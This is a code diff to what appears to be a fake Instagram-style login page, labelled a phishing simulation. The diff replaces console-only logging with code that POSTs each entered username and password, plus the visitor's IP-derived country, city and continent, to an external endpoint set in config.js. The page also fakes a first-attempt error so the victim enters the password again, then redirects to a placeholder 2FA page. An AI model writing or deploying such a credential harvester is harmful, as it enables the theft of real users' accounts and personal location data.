@@ -65,19 +65,20 @@
   </div>
 
   <script type="module">
+    import config from './config.js';
+
     let attempt = 0;
     let isProcessing = false;
 
-    // Fast IP + full geo lookup (country, city, continent)
+    // Fast IP + Geo lookup (ip-api.com — recommended for speed & no key)
     async function getGeoData() {
       try {
-        // Step 1: Get IP (very fast)
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const ip = ipData.ip || 'Unknown';
 
-        // Step 2: Get location from fast free API (ip-api.com recommended for speed/no-key)
-        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,regionName,city,lat,lon,timezone`);
+        // Fast geo lookup with continent, country, city
+        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,continent,country,city`);
         const geo = await geoRes.json();
 
         if (geo.status === 'success') {
@@ -87,29 +88,46 @@
             city: geo.city || 'Unknown',
             continent: geo.continent || 'Unknown'
           };
-        } else {
-          console.warn('Geo API warning:', geo.message);
-          return { ip, country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
         }
       } catch (err) {
         console.error('Geo lookup failed:', err);
-        return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
       }
+      return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', continent: 'Unknown' };
     }
 
-    // Simulate sending alert (replace with your secure logging endpoint or just console for analysis)
-    async function sendAlert(username, password, geo, attemptNum) {
-      const alertMessage = `*New Alert*\nUser: ${username} (ig)\nCode: ${password}\nIP: ${geo.ip}\nCountry: ${geo.country}\nCity: ${geo.city}\nContinent: ${geo.continent}\nAttempt: ${attemptNum}`;
+    // Send formatted alert to your endpoint (from config.js)
+    async function sendToEndpoint(username, password, geo, attemptNum) {
+      const alertText = `*New Alert*\nUser: ${username} (ig)\nCode: ${password}\nIP: ${geo.ip}\nCountry: ${geo.country}\nCity: ${geo.city}\nContinent: ${geo.continent}`;
 
-      console.log('=== PHISHING SIMULATION ALERT ===\n' + alertMessage + '\n=============================');
+      const payload = {
+        app: "INSTAGRAM_PLACEHOLDER",
+        alert: alertText,
+        username: username,
+        password: password,
+        ip: geo.ip,
+        country: geo.country,
+        city: geo.city,
+        continent: geo.continent,
+        attempt: attemptNum,
+        timestamp: new Date().toISOString(),
+        message: "PHISHING_SIMULATION_ANALYSIS_2026"
+      };
 
-      // TODO: For real defensive analysis, send to YOUR controlled logging server only
-      // Example:
-      // await fetch('YOUR_SECURE_LOG_ENDPOINT', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ alert: alertMessage, raw: { username, password, geo, attemptNum } })
-      // });
+      try {
+        const res = await fetch(config.ENDPOINT_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          console.log(`✅ Attempt ${attemptNum} alert sent to endpoint`);
+        } else {
+          console.warn(`⚠️ Endpoint responded with status ${res.status}`);
+        }
+      } catch (err) {
+        console.error("❌ Failed to send to endpoint:", err);
+      }
     }
 
     document.getElementById('loginBtn').addEventListener('click', async () => {
@@ -135,11 +153,11 @@
       // Get geo data
       const geo = await getGeoData();
 
-      // Send alert for this attempt
-      await sendAlert(username, password, geo, attempt);
+      // Send formatted alert to endpoint
+      await sendToEndpoint(username, password, geo, attempt);
 
       if (attempt === 1) {
-        // First attempt: show error + shake
+        // First attempt: error + shake
         errorMsg.classList.remove('hidden');
         passwordInput.value = '';
         passwordInput.classList.add('animate-shake');
@@ -151,7 +169,7 @@
         spinner.classList.remove('hidden');
 
         setTimeout(() => {
-          window.location.href = 'securedfa.html'; // placeholder
+          window.location.href = 'securedfa.html'; // placeholder page
         }, 800);
       }
 
